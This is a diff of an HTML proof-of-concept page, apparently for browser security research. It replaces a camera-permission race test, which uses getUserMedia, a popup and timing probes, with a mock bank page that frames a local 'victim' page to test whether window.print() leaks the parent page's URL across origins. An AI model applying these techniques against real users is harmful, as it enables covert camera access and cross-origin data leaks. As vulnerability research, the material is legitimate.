@@ -1,59 +1,32 @@
 <!doctype html>
 <html>
-<head><meta charset="utf-8"><title>Camera</title>
+<head><title>MyBank - Account Statement</title>
+<meta charset="utf-8">
 <style>
-body{font-family:system-ui;max-width:400px;margin:40px auto;padding:20px}
+body{font-family:system-ui;max-width:700px;margin:20px auto;padding:20px}
+h1{font-size:1.1em;border-bottom:1px solid #ddd;padding-bottom:6px}
+.iframe{border:3px solid #c00;width:100%;height:280px}
 button{display:block;width:100%;padding:12px;margin:8px 0;font-size:14px;cursor:pointer;border:1px solid #ccc;border-radius:5px;background:#f5f5f5}
-button.race{background:#c00;color:#fff}
-pre{background:#fafafa;border:1px solid #eee;padding:10px;font-size:11px;font-family:monospace;white-space:pre-wrap;min-height:60px;max-height:220px;overflow:auto}
-</style></head>
+button.print{background:#c00;color:#fff;font-size:16px}
+pre{background:#f8f8f8;border:1px solid #eee;padding:10px;font-size:11px;font-family:monospace;white-space:pre-wrap;min-height:40px;max-height:160px;overflow:auto}
+</style>
+</head>
 <body>
-<button onclick="block()">1. Block Camera</button>
-<button class="race" onclick="race()">2. Race</button>
-<button onclick="check()">3. Check</button>
-<pre id="L"></pre>
+<h1>Account Statement</h1>
+<p>Your balance: <b>$12,847.32</b></p>
+<pre id="info"></pre>
+
+<iframe class="iframe" src="http://localhost:9081/victim.html"></iframe>
+
 <script>
-var popup;
-var L=function(m){var e=document.getElementById('L');e.textContent+=m+'\n'};
+var info = document.getElementById('info');
+info.textContent = 'URL: ' + location.href + '\n';
+info.textContent += 'Query: ' + location.search + '\n';
+info.textContent += 'Origin: ' + location.origin;
 
-function block(){
-  L('Calling getUserMedia...');
-  navigator.mediaDevices.getUserMedia({video:true})
-    .then(function(s){s.getTracks().forEach(function(t){t.stop()});L('GRANTED — click Block on prompt');})
-    .catch(function(e){L('Camera: '+e.name+(e.name==='NotAllowedError'?' ✓':' — click Block on prompt'));});
-}
-
-function race(){
-  L('Opening popup...');
-  popup=window.open(location.origin+'/race.html','p','width=300,height=150');
-  if(!popup){L('Popup blocked');return}
-  
-  // Measure race window: sync callback vs posted task
-  var posted=false;
-  Promise.resolve().then(function(){
-    L('[microtask] fired — simulates sync BLOCK callback');
-  });
-  setTimeout(function(){
-    posted=true;
-    L('[task] setTimeout(0) fired — simulates bubble close task');
-    L('→ Microtask fires before task ✓ race window confirmed');
-    L('');
-    L('Now testing popup permission state...');
-  },0);
-  
-  // Poll popup to see getUserMedia result (title is set to result)
-  setTimeout(function(){
-    try{ if(popup&&!popup.closed) L('Popup result: '+popup.document.title); }
-    catch(e){ L('Popup result: [Title not readable cross-origin]'); }
-  },2000);
-}
-
-function check(){
-  L('Checking camera on '+location.origin+'...');
-  navigator.mediaDevices.getUserMedia({video:true})
-    .then(function(s){s.getTracks().forEach(function(t){t.stop()});L('⚠️ GRANTED — race may have worked');})
-    .catch(function(e){L('Camera: '+e.name);});
-}
+// The iframe below cannot read top.location.href (blocked by SOP).\n';
+// But if it calls window.print(), the print header/footer will contain\n';
+// this page\'s full URL and title — delivered into the iframe\'s renderer.
 </script>
 </body>
 </html>
